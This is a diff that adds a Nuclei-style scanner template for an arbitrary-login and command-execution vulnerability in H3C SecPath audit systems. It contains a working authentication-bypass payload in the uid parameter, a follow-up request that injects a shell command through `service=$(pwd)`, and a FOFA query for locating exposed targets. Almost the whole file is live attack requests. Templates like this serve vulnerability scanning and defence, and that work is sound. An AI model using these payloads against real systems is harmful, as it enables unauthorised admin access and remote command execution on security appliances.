@@ -1,0 +1,44 @@
+id: h3c-secparh-login-exploit
+
+info:
+  name: H3C SecParh Arbitrary User Login Exploit
+  author: ProjectDiscoveryAI,dostghost
+  severity: critical
+  description: |
+    This template exploits an arbitrary user login vulnerability in the H3C SecParh system. It logs in with a crafted payload and performs a subsequent request to execute commands.只有2018的系统才有可能存在该漏洞
+  reference:
+    - https://github.com/AboSteam/POPC/blob/main/H3C-SecParh%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa-query: app="H3C-SecPath-运维审计系统" && body="2018"
+  tags: h3c,secparh,login,exploit
+
+http:
+  - id: login
+    name: Login Request
+    method: GET
+    raw:
+      - |
+        GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        words:
+          - "审计管理员"
+        part: body
+
+  - id: execute
+    name: Command Execution Request
+    method: GET
+    raw:
+      - |
+        GET /audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(pwd)&identity_cond=&query_type=all&format=json&browse=true HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        words:
+          - "cmdline"
+          - "auditlist"
+        part: body
+    matchers-condition: and
